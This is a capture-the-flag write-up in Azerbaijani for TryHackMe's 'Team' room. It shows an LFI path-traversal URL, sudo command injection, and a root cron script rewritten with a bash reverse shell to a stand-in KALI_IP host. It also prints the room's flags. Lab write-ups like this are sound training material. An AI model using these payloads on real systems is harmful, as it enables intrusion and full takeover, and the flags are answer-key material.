# TryHackMe — Team Room Writeup
**URL:** https://tryhackme.com/room/teamcw  
**Çətinlik:** Asan  
**Kateqoriya:** Linux, Web, Privilege Escalation

---

## Xülasə

Bu room aşağıdakı texnikaları əhatə edir:
- Subdomain kəşfi
- Local File Inclusion (LFI)
- SSH Private Key ilə giriş
- Sudo Privilege Escalation
- Cron Job ilə Root

---

## 1. Kəşfiyyat (Reconnaissance)

### Nmap Skanı

```bash
nmap -sV -sC 10.10.x.x
```

**Nəticə:**
```
22/tcp  open  ssh     OpenSSH 7.6p1
80/tcp  open  http    Apache httpd 2.4.29
21/tcp  open  ftp     vsftpd 3.0.5
```

### /etc/hosts faylını yenilə

```bash
sudo nano /etc/hosts
```

Əlavə et:
```
10.10.x.x    team.thm
```

---

## 2. Web Kəşfi

### team.thm açıldı

Brauzerdə `http://team.thm` açdıqda sadə bir səhifə görünür.

### /scripts/scripts.txt tapıldı

```
http://team.thm/scripts/scripts.txt
```

Faylın içindəki kommentdə yazılmışdı:
```
# Note to self had to change the extension of the old "script" 
# in this folder, as it has creds in
```

### Köhnə skript tapıldı

```
http://team.thm/scripts/script.old
```

İçində **FTP credentials** var idi:
```
ftpuser / [şifrə]
```

---

## 3. FTP Girişi

```bash
ftp 10.10.x.x
```

```
Name: ftpuser
Password: [şifrə]
```

FTP-də `New_site.txt` faylı tapıldı:

```
Dale,
I have started coding a new website in PHP for the team.
It can be found at ".dev" within our domain.
Also please make a copy of your "id_rsa" and place this 
in the relevent config file.
Gyles
```

---

## 4. dev.team.thm — LFI

### /etc/hosts yeniləndi

```bash
sudo nano /etc/hosts
```

```
10.10.x.x    team.thm dev.team.thm
```

### LFI Zəifliyi

```
http://dev.team.thm/index.php?page=../../../../etc/ssh/sshd_config
```

`sshd_config` faylında **Dale-in id_rsa** açarı tapıldı:

```
#Dale id_rsa
#-----BEGIN OPENSSH PRIVATE KEY-----
#b3BlbnNzaC1rZXktdjEAAAA...
#-----END OPENSSH PRIVATE KEY-----
```

---

## 5. SSH Girişi — Dale

### id_rsa faylı hazırlandı

`#` işarələri silindi və fayla yazıldı:

```bash
nano id_rsa
chmod 600 id_rsa
```

### SSH qoşuldu

```bash
ssh -i id_rsa dale@10.10.x.x
```

### User Flag

```bash
cat /home/dale/user.txt
```

```
THM{6Y0TXHz7c2d}
```

---

## 6. Privilege Escalation — Dale → Gyles

### Sudo icazələri yoxlandı

```bash
sudo -l
```

**Nəticə:**
```
(gyles) NOPASSWD: /home/gyles/admin_checks
```

### admin_checks skripti analiz edildi

```bash
cat /home/gyles/admin_checks
```

Skriptdə zəiflik:
```bash
read -p "Enter 'date' to timestamp the file: " error
printf "The Date is "
$error 2>/dev/null
```

`$error` dəyişəni birbaşa icra olunur — **Command Injection!**

### Exploit

```bash
sudo -u gyles /home/gyles/admin_checks
```

```
Enter name of person backing up the data: test
Enter 'date' to timestamp the file: /bin/bash
```

**gyles shell alındı:**
```bash
id
# uid=1001(gyles) groups=1001(gyles),108(lxd),1003(editors),1004(admin)
```

---

## 7. Privilege Escalation — Gyles → Root

### Admin qovluğu kəşf edildi

```bash
find / -group admin 2>/dev/null
# /opt/admin_stuff/script.sh
```

### script.sh analiz edildi

```bash
cat /opt/admin_stuff/script.sh
```

```bash
#!/bin/bash
#I have set a cronjob to run this script every minute
dev_site="/usr/local/sbin/dev_backup.sh"
main_site="/usr/local/bin/main_backup.sh"
$main_site
$dev_site
```

**main_backup.sh hər dəqiqə root tərəfindən işləyir!**

### main_backup.sh-ə Reverse Shell yazıldı

```bash
echo '#!/bin/bash' > /usr/local/bin/main_backup.sh
echo 'bash -i >& /dev/tcp/KALI_IP/4444 0>&1' >> /usr/local/bin/main_backup.sh
chmod +x /usr/local/bin/main_backup.sh
```

### Kali-də Listener açıldı

```bash
nc -lvnp 4444
```

### 1 dəqiqə sonra Root Shell gəldi!

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
```

### Root Flag

```bash
cat /root/root.txt
```

```
THM{fhqbznavfonq}
```

---

## Öyrənilən Texnikalar

| Texnika | İzah |
|---------|------|
| Subdomain Enumeration | dev.team.thm tapıldı |
| Local File Inclusion (LFI) | SSH key əldə edildi |
| SSH Key Authentication | Şifrəsiz giriş |
| Command Injection | $error dəyişəni exploit edildi |
| Cron Job Abuse | Root reverse shell alındı |

---

## Alətlər

- `nmap` — Port skanı
- `gobuster` — Direktory kəşfi
- `ftp` — FTP girişi
- `ssh` — Uzaq giriş
- `nc` — Reverse shell listener

---

*Writeup: TryHackMe Team Room — RaminAbdullayevv*
